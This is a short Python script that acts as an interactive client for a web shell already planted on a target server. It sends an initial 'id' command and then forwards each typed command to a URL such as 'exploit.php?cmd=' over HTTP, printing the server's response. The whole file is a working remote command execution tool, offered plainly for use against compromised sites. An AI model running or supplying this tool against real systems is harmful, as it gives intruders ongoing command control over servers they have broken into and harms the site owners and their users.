import argparse
import requests

def shell(url):
    cmd = 'id'
    while True:
        r = requests.get(url+cmd)
        print(r.text)
        cmd = input('$ ')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, help='Target URL with implemented web shell (f.e. http://mysite.com/exploit.php?cmd=)', required=True)
    args = parser.parse_args()
    shell(args.url)

if __name__ == '__main__':
    main()